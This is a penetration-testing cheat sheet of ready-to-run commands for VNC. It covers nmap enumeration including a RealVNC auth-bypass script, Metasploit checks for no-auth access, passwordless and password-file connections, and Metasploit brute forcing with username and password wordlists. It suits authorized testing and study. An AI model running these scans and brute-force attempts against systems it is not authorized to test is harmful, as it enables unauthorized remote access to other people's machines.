# VNC

## recon

### Nmap enum

Enumerate VNC info, title, and RealVNC auth bypass.

```sh title:"Enumerate VNC with nmap"
nmap -sV --script vnc-info,realvnc-auth-bypass,vnc-title -p "$rport" "$rhost_ip"
```
<!-- cheat
var rhost_ip
var rport := 5900
-->

### No-auth check

Check for VNC servers that allow no-auth access with Metasploit.

```sh title:"Check VNC no-auth access with Metasploit"
msfconsole -x "use auxiliary/scanner/vnc/vnc_none_auth; set RHOSTS $rhost_ip; set RPORT $rport; run; exit"
```
<!-- cheat
var rhost_ip
var rport := 5900
-->

## connect

### No password

Connect to VNC without a password.

```sh title:"Connect to VNC without password"
vncviewer "$rhost_ip::$rport"
```
<!-- cheat
var rhost_ip
var rport := 5900
-->

### Password file

Connect to VNC using a password file.

```sh title:"Connect to VNC with password file"
vncviewer -password "$password_file" "$rhost_ip::$rport"
```
<!-- cheat
var password_file
var rhost_ip
var rport := 5900
-->

## brute force

### Metasploit username

Run Metasploit VNC login check with one username.

```sh title:"Run VNC login check with one username"
msfconsole -x "use auxiliary/scanner/vnc/vnc_login; set RHOSTS $rhost_ip; set RPORT $rport; set USERNAME $user; run; exit"
```
<!-- cheat
var rhost_ip
var rport := 5900
var user
-->

### Metasploit wordlists

Run Metasploit VNC login brute force with user and password files.

```sh title:"Run VNC login brute force with wordlists"
msfconsole -x "use auxiliary/scanner/vnc/vnc_login; set RHOSTS $rhost_ip; set RPORT $rport; set USER_FILE $user_file; set PASS_FILE $pass_file; run; exit"
```
<!-- cheat
var rhost_ip
var rport := 5900
var user_file
var pass_file
-->
